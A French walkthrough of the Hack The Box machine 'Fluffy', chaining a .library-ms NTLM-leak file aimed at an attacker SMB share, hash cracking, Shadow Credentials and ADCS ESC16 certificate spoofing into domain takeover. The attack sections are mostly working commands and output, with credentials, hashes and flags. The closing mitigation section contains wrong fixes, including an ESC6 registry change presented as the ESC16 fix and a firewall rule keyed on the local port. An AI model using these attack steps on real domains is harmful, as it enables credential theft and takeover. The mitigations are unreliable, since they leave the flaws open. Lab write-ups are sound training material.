# 🎯 FLUFFY - HTB Write-Up Complet et Optimisé

## 📋 Résumé Exécutif

**Machine :** Fluffy (10.10.11.69)  
**OS :** Windows Server 2019 Build 17763  
**Domaine :** fluffy.htb / DC01.fluffy.htb  
**Difficulté :** Medium  
**Points Clés :** CVE-2025-24071, Shadow Credentials, ADCS ESC16

### 🔗 Chaîne d'Attaque Complète

```
j.fleischman (creds fournis)
    ↓ [CVE-2025-24071 - .library-ms]
p.agila (hash NTLMv2 → cracké)
    ↓ [Ajout au groupe "Service Accounts"]
GenericWrite sur winrm_svc & ca_svc
    ↓ [Shadow Credentials sur winrm_svc]
winrm_svc (NT hash → WinRM)
    ↓ [ESC16 - UPN Spoofing via ca_svc]
Administrator (certificat malveillant)
```

---

## 1️⃣ RECONNAISSANCE

### 🔍 Scan Nmap

```bash
# Scan rapide des ports
nmap -p- --min-rate 10000 10.10.11.69

# Scan détaillé
nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.69
```

**Résultats :**

| Port | Service | Version |
|------|---------|---------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 389/636 | LDAP/LDAPS | Active Directory LDAP |
| 445 | SMB | Microsoft-DS |
| 3268/3269 | Global Catalog | LDAP |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |
| 9389 | ADWS | .NET Message Framing |

**Identification :**
- **Domaine :** fluffy.htb
- **Hostname :** DC01.fluffy.htb
- **Rôle :** Domain Controller
- **ADCS :** fluffy-DC01-CA (détecté dans certificat SSL)

### 📝 Configuration /etc/hosts

```bash
echo "10.10.11.69 dc01.fluffy.htb fluffy.htb" | sudo tee -a /etc/hosts
```

---

## 2️⃣ CREDENTIALS INITIAUX

**Fournis par HackTheBox :**
```
Utilisateur : j.fleischman
Mot de passe : J0elTHEM4n1990!
```

### ✅ Vérification d'Accès

```bash
# SMB ✅
netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
# [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!

# LDAP ✅
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
# [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!

# WinRM ❌
netexec winrm dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
# [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

**Conclusion :** Pas d'accès WinRM avec j.fleischman, focus sur SMB et LDAP.

---

## 3️⃣ ÉNUMÉRATION ACTIVE DIRECTORY

### 🩸 BloodHound Collection

```bash
bloodhound-ce-python \
  -c all \
  -d fluffy.htb \
  -u j.fleischman \
  -p 'J0elTHEM4n1990!' \
  -ns 10.10.11.69 \
  --zip
```

**Résultats :**
- 10 utilisateurs
- 54 groupes
- 1 ordinateur (DC01)
- 2 GPOs
- 19 conteneurs

### 🎯 Analyse du Graphe AD

**Shortest Paths from Owned Objects (j.fleischman) :**

```
j.fleischman
    → MemberOf → [aucun groupe intéressant]
    
p.agila (à découvrir)
    → MemberOf → [peut rejoindre Service Account Managers]
    
Service Account Managers
    → GenericAll → Service Accounts (groupe)
    
Service Accounts (groupe)
    → GenericWrite → winrm_svc
    → GenericWrite → ca_svc
    → GenericWrite → ldap_svc
    
winrm_svc
    → MemberOf → Remote Management Users (WinRM access)
    
ca_svc
    → MemberOf → Cert Publishers (ADCS enrollment rights)
```

**Point Clé :** Le groupe "Service Accounts" a `GenericWrite` sur plusieurs comptes de service stratégiques.

---

## 4️⃣ ÉNUMÉRATION ADCS

### 🔐 Vérification ADCS

```bash
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
```

**Résultat :**
```
Found PKI Enrollment Server: DC01.fluffy.htb
Found CN: fluffy-DC01-CA
```

### 📜 Analyse Certipy (Initial)

```bash
certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
```

**Configuration CA Critique :**
```yaml
CA Name: fluffy-DC01-CA
User Specified SAN: Disabled
Request Disposition: Issue
Enforce Encryption for Requests: Enabled
Disabled Extensions: 1.3.6.1.4.1.311.25.2  # ⚠️ Security Extension désactivée !
Permissions:
  Enroll: FLUFFY.HTB\Cert Publishers
```

**⚠️ Pas de vulnérabilité détectée avec Certipy v4.8.2 !**

> **Note Importante :** ESC16 n'est détecté que par **Certipy v5.0+**. Mise à jour nécessaire :
> ```bash
> uv tool upgrade certipy-ad
> ```

---

## 5️⃣ ÉNUMÉRATION SMB

### 📁 Partages Disponibles

```bash
netexec smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

**Résultat :**
```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
IT              READ,WRITE      ⭐ Partage personnalisé !
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

### 🗂️ Exploration du Partage IT

```bash
smbclient '//10.10.11.69/IT' -U 'j.fleischman%J0elTHEM4n1990!'
```

**Contenu :**
```
Everything-1.4.1.1026.x64/      (dossier)
Everything-1.4.1.1026.x64.zip   (1.8 MB)
KeePass-2.58/                   (dossier)
KeePass-2.58.zip                (3.2 MB)
Upgrade_Notice.pdf              (170 KB) ⭐
```

### 📄 Analyse du PDF

```bash
smb: \> get Upgrade_Notice.pdf
pdfinfo Upgrade_Notice.pdf
```

**Métadonnées :**
```yaml
Title: Upgrade Notice For IT Department
Keywords: DAGnmrYlJoI,BAF-XVRpOno,0
Author: p.agila  ⭐ USERNAME DÉCOUVERT !
CreationDate: Sat May 17 09:22:32 2025
```

**Contenu du PDF :**
- Liste de CVEs à patcher dont **CVE-2025-24071** (Critical)
- Email de contact : infrastructure@fluffy.htb
- **Indice majeur :** CVE-2025-24071 est lié aux fichiers .library-ms

---

## 6️⃣ EXPLOITATION - CVE-2025-24071

### 🎓 Qu'est-ce que CVE-2025-24071 ?

**Vulnérabilité :** Exposition d'informations sensibles dans Windows File Explorer  
**Vecteur :** Fichiers `.library-ms` malveillants dans archives ZIP/RAR  
**Impact :** Capture automatique de hash NTLMv2 sans interaction utilisateur significative

**Mécanisme Technique :**

1. **Fichier .library-ms** : Format XML définissant des "bibliothèques" Windows
2. **Élément malveillant** : Pointeur vers ressource SMB distante (`\\ATTACKER_IP\share`)
3. **Déclencheur** : Simple survol, clic droit, ou extraction de l'archive
4. **Résultat** : Windows tente une authentification NTLM automatique vers l'attaqueur

**Similarité :** Variante de CVE-2024-43451 (vulnérabilité similaire patchée)

### 🛠️ Génération du Payload

**POC utilisé :** [Marcejr117/CVE-2025-24071_PoC](https://github.com/Marcejr117/CVE-2025-24071_PoC)

```bash
# Téléchargement du POC
git clone https://github.com/Marcejr117/CVE-2025-24071_PoC
cd CVE-2025-24071_PoC

# Génération du fichier malveillant
uv run --script poc.py attacker 10.10.16.3

# Résultat :
# [+] File attacker.library-ms created successfully.
# exploit.zip généré (contient attacker.library-ms)
```

**Contenu du fichier .library-ms :**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription ...>
  <name>@shell32.dll,-34575</name>
  <url>\\10.10.16.3\share</url>  ⬅️ Pointe vers l'attaquant
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.16.3\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### 🎣 Préparation de Responder

```bash
sudo responder -I tun0
```

**Serveurs activés :**
```
✅ SMB server [ON]
✅ HTTP server [ON]
✅ LDAP server [ON]
✅ Kerberos server [ON]
```

### 📤 Upload et Capture

```bash
smbclient '//10.10.11.69/IT' -U 'j.fleischman%J0elTHEM4n1990!'

smb: \> put exploit.zip
smb: \> ls
# ... exploit.zip uploadé ...
```

**⏱️ Moins d'une minute plus tard :**

```bash
smb: \> ls
# exploit/ ⬅️ Archive extraite automatiquement !
```

**📡 Capture Responder :**

```
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:fa8079ed38b9d6aa:1BB2400200B23B23BD7907534A19D651:010100000000000080BF233D4B6DDC017C882F184FB6657B0000000002000800310043004700380001001E00570049004E002D004300450037003700420050004700420046003600520004003400570049004E002D00430045003700370042005000470042004600360052002E0031004300470038002E004C004F00430041004C000300140031004300470038002E004C004F00430041004C000500140031004300470038002E004C004F00430041004C000700080080BF233D4B6DDC01060004000200000008003000300000000000000001000000002000005407E252C9550081F2F9616EEEA7B8B678064D8482B8501C3F6DBA390A03E0320A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
```

### 🔓 Cracking du Hash

**Hash Type :** NetNTLMv2 (mode 5600)

```bash
hashcat -m 5600 p.agila.hash /usr/share/wordlists/rockyou.txt
```

**Résultat (10 secondes) :**
```
P.AGILA::FLUFFY:...:prometheusx-303

Session.........: hashcat
Status..........: Cracked
Hash.Mode.......: 5600 (NetNTLMv2)
Time.Started....: Sun Dec 14 22:50:16 2025 (1 sec)
```

### ✅ Vérification

```bash
netexec smb dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
# SMB  [+] fluffy.htb\p.agila:prometheusx-303

netexec winrm dc01.fluffy.htb -u p.agila -p 'prometheusx-303'
# WINRM [-] fluffy.htb\p.agila:prometheusx-303  ❌ Pas de WinRM
```

---

## 7️⃣ LATERAL MOVEMENT - SHADOW CREDENTIALS

### 🎓 Qu'est-ce que Shadow Credentials ?

**Définition :** Technique d'attaque AD exploitant l'attribut `msDS-KeyCredentialLink` pour obtenir l'authentification d'un compte sans connaître son mot de passe.

**Mécanisme Technique :**

1. **Prérequis :** Permissions `GenericWrite` ou `WriteProperty` sur l'attribut `msDS-KeyCredentialLink` d'un compte cible
2. **Attaque :**
   - Génération d'une paire de clés RSA (publique/privée)
   - Ajout de la clé publique dans `msDS-KeyCredentialLink` du compte cible
   - Authentification Kerberos PKINIT avec la clé privée
   - Récupération d'un TGT
   - Extraction du hash NT via requête Kerberos U2U (User-to-User)

**Conditions Windows :**
- Windows Server 2016+ avec fonctionnalité "Windows Hello for Business" ou "Hybrid Azure AD Join"
- Fonctionnalité Key Trust activée pour le domaine

**Avantages :**
- ✅ Pas besoin de cracker de mot de passe
- ✅ Pas de modification du mot de passe (discret)
- ✅ Récupération du hash NT utilisable pour Pass-the-Hash

### 🔐 Ajout au Groupe "Service Accounts"

**Analyse BloodHound :**
```
p.agila
  → Can be added to → Service Account Managers
    → GenericAll → Service Accounts
      → GenericWrite → winrm_svc, ca_svc, ldap_svc
```

**Ajout avec BloodyAD :**

```bash
bloodyAD \
  -u p.agila \
  -p 'prometheusx-303' \
  -d fluffy.htb \
  --host dc01.fluffy.htb \
  add groupMember 'service accounts' p.agila

# [+] p.agila added to service accounts
```

**Vérification :**

```bash
bloodyAD \
  -u p.agila \
  -p 'prometheusx-303' \
  -d fluffy.htb \
  --host dc01.fluffy.htb \
  get object p.agila

# memberOf: ...; CN=Service Accounts,CN=Users,DC=fluffy,DC=htb; ...
```

### 🗝️ Exploitation Shadow Credentials sur winrm_svc

```bash
certipy-ad shadow auto \
  -u p.agila@fluffy.htb \
  -p prometheusx-303 \
  -account winrm_svc
```

**Résultat :**

```
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ce14ad2d-fb9d-1e9b-9fdb-a3aac3abbebd'
[*] Adding Key Credential with device ID 'ce14ad2d-fb9d-1e9b-9fdb-a3aac3abbebd' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential [...]
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'  ⬅️ OPSEC : Restauration !
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767  ⭐
```

### 🗝️ Exploitation Shadow Credentials sur ca_svc (Bonus)

```bash
certipy-ad shadow auto \
  -u p.agila@fluffy.htb \
  -p prometheusx-303 \
  -account ca_svc

# [*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8  ⭐
```

**💡 Résolution du Mystère :** Le hash `ca_svc` manquant dans mes logs initiaux a été obtenu via **Shadow Credentials** et non par Kerberoasting !

### 🖥️ Accès WinRM

```bash
evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

**Résultat :**

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
fluffy\winrm_svc

*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
c5f8ed1478d7f0a3d0ac7403e16b5854  ⭐ USER FLAG
```

---

## 8️⃣ PRIVILEGE ESCALATION - ESC16 (ADCS)

### 🎓 Qu'est-ce que ESC16 ?

**Définition :** Vulnérabilité ADCS où l'extension de sécurité `szOID_NTDS_CA_SECURITY_EXT` est globalement désactivée au niveau de la CA.

**OID désactivé :** `1.3.6.1.4.1.311.25.2`

**Impact :** Cette extension est responsable du "Strong Certificate Mapping" (liaison forte certificat ↔ compte AD). Sans elle, la CA ne vérifie **pas** que l'UPN dans le certificat correspond réellement à l'utilisateur qui le demande.

**Conditions d'Exploitation :**

| Condition | État Fluffy |
|-----------|-------------|
| Extension de sécurité désactivée | ✅ `Disabled Extensions: 1.3.6.1.4.1.311.25.2` |
| Contrôle d'un compte enrollable | ✅ ca_svc (membre de Cert Publishers) |
| GenericWrite sur ce compte | ✅ Via groupe Service Accounts |
| Certificat sans ObjectSID | ✅ Templates schema v1 |

**Différence ESC16 vs ESC5 :**

| Aspect | ESC5 | ESC16 |
|--------|------|-------|
| **Niveau** | Template spécifique | CA globale |
| **Cause** | Permissions WriteProperty sur UPN + template utilisant UPN comme SAN | Extension de sécurité désactivée |
| **Scope** | Un template vulnérable | **TOUS les templates** |
| **Fix** | Restrictions sur template | Réactivation extension au niveau CA |

### 🔍 Détection ESC16

**⚠️ Certipy v5.0+ REQUIS !**

```bash
# Vérification version
certipy-ad --version
# Certipy v5.0.2 (ou supérieur)

# Si version < 5.0 :
uv tool upgrade certipy-ad
```

**Scan avec ca_svc :**

```bash
certipy-ad find \
  -u ca_svc@fluffy.htb \
  -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -vulnerable \
  -stdout
```

**Résultat :**

```yaml
Certificate Authorities:
  0:
    CA Name: fluffy-DC01-CA
    DNS Name: DC01.fluffy.htb
    User Specified SAN: Disabled
    Request Disposition: Issue
    Disabled Extensions: 1.3.6.1.4.1.311.25.2  ⚠️
    Permissions:
      Enroll: FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities:
      ESC16: Security Extension is disabled.  ⭐
    [*] Remarks:
      ESC16: Other prerequisites may be required for this to be exploitable.
```

### 🎯 Exploitation ESC16

**Étape 1 : Vérification UPN Actuel de ca_svc**

```bash
certipy-ad account \
  -u winrm_svc@fluffy.htb \
  -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc \
  read
```

**Résultat :**
```yaml
cn: certificate authority service
sAMAccountName: ca_svc
servicePrincipalName: ADCS/ca.fluffy.htb
userPrincipalName: ca_svc@fluffy.htb  ⬅️ UPN original
memberOf: CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb
```

**Étape 2 : Modification de l'UPN (UPN Spoofing)**

```bash
certipy-ad account \
  -u winrm_svc@fluffy.htb \
  -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc \
  -upn administrator \
  update
```

**Résultat :**
```
[*] Updating user 'ca_svc':
    userPrincipalName: administrator  ⬅️ Pas de @domain !
[*] Successfully updated 'ca_svc'
```

**Vérification :**

```bash
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read

# userPrincipalName: administrator  ⭐ Modifié !
```

**Étape 3 : Demande de Certificat avec Template "User"**

```bash
certipy-ad req \
  -u ca_svc \
  -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -dc-ip 10.10.11.69 \
  -target dc01.fluffy.htb \
  -ca fluffy-DC01-CA \
  -template User
```

**Résultat :**

```
[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@fluffy.htb'  ⭐
[*] Certificate has no object SID  ⬅️ Confirme ESC16 (schema v1)
[*] Saving certificate and private key to 'administrator.pfx'
```

**🎉 Certificat Malveillant Généré !**

**Étape 4 : Restauration UPN (OPSEC)**

```bash
certipy-ad account \
  -u winrm_svc@fluffy.htb \
  -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc \
  -upn ca_svc@fluffy.htb \
  update

# [*] Successfully updated 'ca_svc'
```

**Étape 5 : Authentification avec le Certificat**

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.10.11.69 \
  -username administrator \
  -domain fluffy.htb
```

**Résultat :**

```
[*] Certificate identities:
[*] SAN UPN: 'Administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e  ⭐
```

**Étape 6 : Accès Domain Admin**

```bash
evil-winrm -i 10.10.11.69 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

**Résultat :**

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
acee5f56136bcb1e2fab9abee19bb76e  ⭐ ROOT FLAG
```

---

## 9️⃣ TIMELINE COMPLÈTE

| Temps | Action | Résultat |
|-------|--------|----------|
| T+0 | Nmap scan | DC identifié (fluffy.htb) |
| T+5 | SMB enumeration | Partage IT + PDF trouvé |
| T+10 | Analyse PDF | Utilisateur p.agila + CVE-2025-24071 |
| T+15 | BloodHound collection | Graphe AD mappé |
| T+20 | ADCS enumeration (Certipy v4) | Aucune vuln détectée ❌ |
| T+25 | CVE-2025-24071 exploit | Hash NTLMv2 p.agila capturé |
| T+26 | Hashcat crack | p.agila:prometheusx-303 |
| T+35 | Ajout à "Service Accounts" | GenericWrite obtenu |
| T+40 | Shadow Credentials (winrm_svc) | Hash NT récupéré |
| T+42 | Shadow Credentials (ca_svc) | Hash NT récupéré |
| T+45 | WinRM winrm_svc | **USER FLAG** |
| T+50 | Mise à jour Certipy v5.0+ | ESC16 maintenant détectable |
| T+55 | Scan ADCS avec ca_svc | ESC16 confirmé ⭐ |
| T+60 | Modification UPN ca_svc | administrator |
| T+65 | Demande certificat | administrator.pfx obtenu |
| T+68 | Restauration UPN | OPSEC |
| T+70 | Auth avec certificat | Hash Administrator récupéré |
| T+75 | WinRM Administrator | **ROOT FLAG** |

**Durée totale :** ~75 minutes

---

## 🔟 DÉTECTION & MITIGATION

### 🛡️ Détection CVE-2025-24071

**Event IDs Windows :**

```powershell
# Event ID 4624 - Logon Type 3 (Network)
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and
    $_.Properties[8].Value -eq 3 -and  # Logon Type = Network
    $_.Message -match "10\.10\.16\."    # IP externe suspecte
}
```

**Détection Firewall :**
```powershell
# Connexions SMB sortantes (port 445)
Get-NetFirewallRule | Where-Object {
    $_.Direction -eq "Outbound" -and
    $_.LocalPort -eq 445
}
```

**Mitigations :**

1. **Bloquer .library-ms sur partages réseau :**
```powershell
$DenyExtensions = @("*.library-ms", "*.searchConnector-ms")
Set-FSRMFileScreenException -Path "\\server\share" -IncludePattern $DenyExtensions
```

2. **Désactiver authentification NTLM automatique :**
```
GPO: Computer Configuration → Administrative Templates 
→ Network → Lanman Workstation
→ "Enable insecure guest logons" = Disabled
```

3. **Pare-feu sortant SMB :**
```powershell
New-NetFirewallRule \
  -DisplayName "Block Outbound SMB" \
  -Direction Outbound \
  -Protocol TCP \
  -LocalPort 445 \
  -Action Block
```

### 🛡️ Détection Shadow Credentials

**Event IDs :**

```powershell
# Event ID 5136 - Directory Service Object Modified
# Attribut modifié : msDS-KeyCredentialLink
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 5136 -and
    $_.Message -match "msDS-KeyCredentialLink"
}
```

**Script de Monitoring :**

```powershell
$SensitiveAttributes = @(
    "msDS-KeyCredentialLink",
    "userPrincipalName",
    "servicePrincipalName"
)

foreach ($Attr in $SensitiveAttributes) {
    $Events = Get-WinEvent -LogName Security -MaxEvents 1000 | Where-Object {
        $_.Id -eq 5136 -and $_.Message -match $Attr
    }
    if ($Events) {
        Write-Warning "Modification détectée sur $Attr !"
        $Events | Select TimeCreated, Message | Format-Table
    }
}
```

**Mitigations :**

1. **Audit des ACLs :**
```powershell
# Vérifier qui a WriteProperty sur msDS-KeyCredentialLink
Get-ADUser -Filter * -Properties nTSecurityDescriptor | ForEach-Object {
    $ACL = $_.nTSecurityDescriptor.Access | Where-Object {
        $_.ActiveDirectoryRights -match "WriteProperty" -and
        $_.ObjectType -eq "5b47d60f-6090-40b2-9f37-2a4de88f3063"  # GUID msDS-KeyCredentialLink
    }
    if ($ACL) {
        [PSCustomObject]@{
            User = $_.SamAccountName
            Trustees = $ACL.IdentityReference
        }
    }
}
```

2. **Principe du moindre privilège :**
```powershell
# Retirer GenericWrite inutiles
Remove-ADPermission \
  -Identity "CN=winrm_svc,CN=Users,DC=fluffy,DC=htb" \
  -User "Service Accounts" \
  -AccessRights GenericWrite
```

### 🛡️ Détection & Mitigation ESC16

**Détection :**

```powershell
# Event ID 4886/4887 - Certificate Services Request
Get-WinEvent -LogName Security | Where-Object {
    ($_.Id -eq 4886 -or $_.Id -eq 4887) -and
    $_.Message -match "administrator"  # UPN suspect
}

# Event ID 4738 - User Account Changed
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4738 -and
    $_.Message -match "User Principal Name"
}
```

**Script de Détection ESC16 :**

```powershell
# Vérifier si l'extension de sécurité est activée
$CA = Get-CertificationAuthority
$DisabledExts = $CA.GetCAProperty("DisabledExtensionList")

if ($DisabledExts -contains "1.3.6.1.4.1.311.25.2") {
    Write-Warning "⚠️ ESC16 DÉTECTÉ : Extension de sécurité désactivée !"
}
```

**Mitigations CRITIQUES :**

1. **Réactiver l'extension de sécurité (FIX ESC16) :**

```powershell
# Sur la CA, en tant qu'admin
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Redémarrer le service
Restart-Service CertSvc
```

2. **Restreindre WriteProperty sur UPN :**

```powershell
# Audit
Get-ADUser -Filter * | ForEach-Object {
    $ACL = Get-Acl "AD:\$($_.DistinguishedName)"
    $Suspicious = $ACL.Access | Where-Object {
        $_.ActiveDirectoryRights -match "WriteProperty" -and
        $_.ObjectType -eq "28630ebf-41d5-11d1-a9c1-0000f80367c1"  # GUID UPN
    }
    if ($Suspicious -and $_.MemberOf -match "Cert Publishers") {
        Write-Warning "🚨 $($_.SamAccountName) peut modifier son UPN et enroll !"
    }
}
```

3. **Utiliser "Subject built from AD" sur templates :**

```powershell
# Forcer le sujet à venir d'AD (pas de l'utilisateur)
Set-CATemplate -Name "User" -SubjectNameFlags "CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH"
```

4. **Activer Manager Approval :**

```powershell
Set-CATemplate -Name "User" -Flag "+PEND_ALL_REQUESTS"
```

5. **Monitoring UPN Changes :**

```powershell
# Alerte sur toute modification UPN de comptes sensibles
$CertPublishers = Get-ADGroupMember "Cert Publishers"

foreach ($User in $CertPublishers) {
    # Audit trail
    Get-WinEvent -LogName Security | Where-Object {
        $_.Id -eq 4738 -and
        $_.Message -match $User.SamAccountName -and
        $_.Message -match "User Principal Name"
    }
}
```

---

## 1️⃣1️⃣ OUTILS UTILISÉS

| Outil | Version | Usage |
|-------|---------|-------|
| nmap | 7.94SVN | Port scanning et version detection |
| netexec | latest | SMB/LDAP/WinRM enumeration |
| BloodHound CE Python | latest | AD graph analysis |
| **certipy-ad** | **v5.0.2+** | **ADCS vuln scanning (ESC16)** |
| BloodyAD | latest | AD object manipulation (groupes, ACLs) |
| Responder | 3.1.7.0 | NTLMv2 hash capture |
| hashcat | 6.2.6 | Password cracking (mode 5600) |
| evil-winrm | 3.9 | WinRM remote access |
| CVE-2025-24071 PoC | Marcejr117 | Malicious .library-ms generation |

**⚠️ Note Importante :** ESC16 n'est détecté que par **Certipy v5.0+** (commit du 10 mai 2025). Versions antérieures ne trouvent rien !

---

## 1️⃣2️⃣ LEÇONS APPRISES

### ✅ Points Clés Techniques

1. **CVE-2025-24071 :** Les fichiers `.library-ms` dans des archives peuvent déclencher une authentification NTLM automatique. Simple mais efficace.

2. **Shadow Credentials > Kerberoasting :** 
   - Kerberoasting échoue si mots de passe forts (aucun hash cracké ici)
   - Shadow Credentials = hash NT direct sans cracking nécessaire

3. **ESC16 = Vulnérabilité CA Globale :**
   - Contrairement à ESC1-ESC5 (templates spécifiques)
   - Affecte **TOUS** les templates
   - Nécessite Certipy v5.0+ pour détection

4. **Importance des Versions d'Outils :**
   - Certipy v4.8.2 → Aucune vuln détectée ❌
   - Certipy v5.0.2 → ESC16 trouvé ✅
   - Toujours vérifier les changelogs récents

5. **BloodHound = Guide de l'Attaque :**
   - Graphe `Service Accounts → GenericWrite → winrm_svc/ca_svc` montre le chemin exact
   - "Shortest Paths from Owned" = roadmap automatique

### 🛡️ Recommandations Défensives

1. **Désactiver Authentification NTLM Automatique**
2. **Bloquer SMB Sortant (Port 445)**
3. **Auditer les Permissions AD Régulièrement**
4. **Réactiver Extension de Sécurité CA (Fix ESC16)**
5. **Monitoring Event IDs : 4624, 4738, 4886, 4887, 5136**
6. **Mots de Passe 20+ Caractères pour Comptes de Service**

### 💡 Réflexions Pentest

- **CVE dans PDFs = Indices** (pas seulement du texte)
- **Patience** : L'extraction du .library-ms prend <1min, ne pas abandonner
- **OPSEC** : Certipy restaure automatiquement les KeyCredentials (bon point)
- **Chaînes d'Attaque AD** : Rarement linéaires, souvent plusieurs pivots nécessaires

---

## 📚 RESSOURCES

### CVE-2025-24071
- [NIST CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071)
- [Microsoft Security Update](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071)
- [POC Marcejr117](https://github.com/Marcejr117/CVE-2025-24071_PoC)
- [Article Bleeping Computer](https://www.bleepingcomputer.com/news/security/cve-2025-24071-exploit/)

### Shadow Credentials
- [SpecterOps - Key Trust Account Mapping](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Elad Shamir - Whitepaper](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

### ADCS & ESC16
- [Certipy Wiki - ESC16](https://github.com/ly4k/Certipy/wiki/ESC16)
- [SpecterOps - Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [HackTricks - ADCS Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates)
- [Microsoft ADCS Best Practices](https://learn.microsoft.com/windows-server/identity/ad-cs/ad-cs-security-guidance)

### Outils
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [BloodyAD GitHub](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [Responder GitHub](https://github.com/lgandx/Responder)

---

## 🎯 CONCLUSION

**Fluffy** est un excellent exemple de pentest AD réaliste combinant :

✅ **Vulnérabilité 0-day récente** (CVE-2025-24071 - Mars 2025)  
✅ **Techniques AD modernes** (Shadow Credentials, ADCS)  
✅ **Exploitation de permissions subtiles** (GenericWrite)  
✅ **Vulnérabilité ADCS rare** (ESC16, peu connue)

**Chemin d'attaque complet :**
```
Creds initiaux → CVE-2025-24071 → Shadow Credentials → ESC16 → DA
```

**Ce write-up couvre :**
- ✅ Énumération complète (nmap, SMB, LDAP, ADCS, BloodHound)
- ✅ Exploitation détaillée de 3 vulnérabilités majeures
- ✅ Explications techniques approfondies
- ✅ Scripts de détection et mitigation
- ✅ Timeline précise
- ✅ Aspects OPSEC (restauration KeyCredentials, UPN)

**Points uniques :**
- 🔍 Identification du mystère du hash ca_svc (Shadow Credentials)
- 🔍 Importance de Certipy v5.0+ pour ESC16
- 🔍 Analyse BloodHound complète du graphe AD
- 🔍 Différenciation ESC16 vs ESC5

---

**🏆 Flags :**
- **User :** `c5f8ed1478d7f0a3d0ac7403e16b5854`
- **Root :** `acee5f56136bcb1e2fab9abee19bb76e`

---

*Write-up complet et optimisé - Fluffy HTB - Décembre 2025*
